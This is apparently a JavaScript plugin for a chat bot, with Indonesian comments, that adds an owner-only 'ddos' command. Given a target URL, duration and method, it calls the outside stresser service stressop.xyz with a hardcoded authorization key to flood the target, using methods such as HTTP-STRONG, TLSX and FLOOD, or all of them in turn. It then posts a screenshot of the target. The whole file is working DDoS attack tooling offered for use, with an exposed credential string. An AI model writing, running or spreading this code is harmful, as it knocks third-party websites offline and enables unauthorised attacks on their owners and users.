/*
『NOTICE』 Hak cipta dilindungi.
* Script ini dibuat oleh Obscura
* Gunakan dengan bijak.
* Telegram: https://t.me/DelioGalileio
*/

/* 
*/

import fetch from "node-fetch";
// Status global untuk melacak apakah ada serangan yang sedang berlangsung


// Daftar metode serangan yang valid, termasuk tambahan 'all'
const validMethods = ['HTTP-STRONG', 'HTTP-OP', 'TLSX', 'RAW', 'TLS-HOLD', 'RAPID', 'FLOOD', 'all'];

let handler = async (m, { conn, command, args }) => {
  if (!args[0]) return conn.reply(m.chat, "*[🔎] Where's The URL? *", m);
  if (!args[1]) return conn.reply(m.chat, "*[🔎] Where's The Timeout? *", m);
  if (!args[2]) return conn.reply(m.chat, "*[🔎] Where's The Method? *", m);

  // Cek apakah metode yang diberikan valid, termasuk 'all'
  if (!validMethods.includes(args[2])) {
    return conn.reply(m.chat, `❌ Invalid method! Use one of the following methods: ${validMethods.join(', ')}`, m);
  }


  const hackerIntro = `*DDoS Attack Started* 🛡️\n\n*Target:* ${args[0]}\n*Timeout:* ${args[1]} seconds\n*Method:* ${args[2] === 'all' ? 'All Methods' : args[2]}`;
  await m.reply(`\`\`\`${hackerIntro}\`\`\``);

  try {
    // Jika metode yang dipilih adalah 'all', jalankan semua metode dalam validMethods kecuali 'all'
    const methodsToExecute = args[2] === 'all' ? validMethods.filter(method => method !== 'all') : [args[2]];

    // Loop melalui setiap metode dan jalankan serangan
    for (const method of methodsToExecute) {
      await m.reply(`🚀 Launching attack with method: ${method}`);
      const response = await fetch(`https://stressop.xyz/api/router?host=${args[0]}&time=${args[1]}&method=${method}`, {
        method: 'GET', // Atur sesuai request method yang dibutuhkan
        headers: {
          'Authorization': 'MIICXAIBAAKBgQCPNc4kXZAnT1WCtF3EkLXhzFCOR4pa/iUErjw1l87NKKNyEBPxzPzavHi66fG7iCqpgb3Bw675k20Q4mTZixPDgOuFgjU+8cLf3eU5ciEQrpEEeyxLPLwYVyTBcPCImTfh0ooqGsBwHLe+QhWTOOn1lNlAnfd78g5AJANWVQ4YGDGuUQIDAQABAoGAMsa98vTai+IB7yQCeIlzw7RRA2VXLAQHkxe2KI2HimJVWE7jm4n6q6I5iEul8meeC2Y92zNlQhvY8vldVfJKySlA/M6wvg4o2ES5PfJomv3mf9BISyZaVKsNCMXlmKz3PwXgU7oETK108rvUHeLrtsuoBN50xEb4bp0TnFP6ctFrmykCQQDzPQzXHh+Kgt3ukkTeWjmrrsuhUgqsQWkakQRFwQMwCxxc20td7wDNUrLcqyAlx2rksxTLJSi/vEqtmTqCudefAkEAlrlE78b36l87YFar8x3D5JQQGb6ypfyNV45BGVPX1axEzFMb40H6jMUzhkT3TFkgb2HHiA52mKPc2r0cyCZ0DwJASawyGW3sS727jqkK5vYZBaEZ2DDLPsVJGlzWGHKPjpuu6YkaWMctTQNBXYkPYaH3BHIhWC5XG0viqpYAnNvBLQJAYuPl1ghOqsiW1YuoP9e8qmF2+t1Cq2M7fUHJdourJfdkIEc7Ge01aV1JhAQF2WL0w/s+YMiX29NZTzx4yzmXjrq1b5eHacdeV+FnyHkmRzw0FeIQJ5zQlACRju+nSUmYHWFmD6zo=', // Ganti sesuai token otorisasi
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
          'Referer': 'https://stressop.xyz/dashboard/panel',
        }
      });

      if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    }

    await m.reply(`✅ DDoS attack(s) completed successfully!`);

  } catch (e) {
    console.error(e);
    await m.reply(`❌ An error occurred: ${e.message}`);
  } finally {
    // Capture a screenshot of the URL and send it
    try {
      let screenshot = await (await fetch(`https://image.thum.io/get/fullpage/${args[0]}`)).buffer();
      await conn.sendFile(m.chat, screenshot, 'screenshot.png', `Screenshot of ${args[0]}`);
    } catch (e) {
      await m.reply(`❌ Failed to capture screenshot: ${e.message}`);
    }
  }
};

handler.help = ["ddos"].map((v) => v + " <url> <timeout> <method>");
handler.tags = ["owner"];

handler.command = /^(ddos)$/i;
handler.owner = true;

export default handler;